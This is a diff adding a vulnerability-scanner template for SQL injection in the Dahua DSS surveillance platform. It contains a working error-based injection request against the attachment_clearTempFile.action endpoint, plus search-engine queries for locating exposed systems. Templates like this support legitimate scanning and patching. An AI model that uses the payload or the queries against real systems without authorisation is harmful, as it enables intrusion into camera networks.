@@ -1,0 +1,24 @@
+id: dahua-dss-attachment-cleartempfile-sqli
+
+info:
+  name: 大华DSS数字监控系统attachment_clearTempFile.action存在SQL注入漏洞
+  author: Abbbbb
+  severity: high
+  metadata:
+    fofa-query: app="dahua-DSS"
+    hunter-query: app.name="Dahua 大华 DSS 视频管理系统"
+
+http:
+  - raw:
+      - |
+        GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(1,concat(0x7e,md5(99999),0x7e))%20or%20(%2799%27=%2799&bean.TabName=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"d3eb9a9233e52948740d7eb8c3062d1")
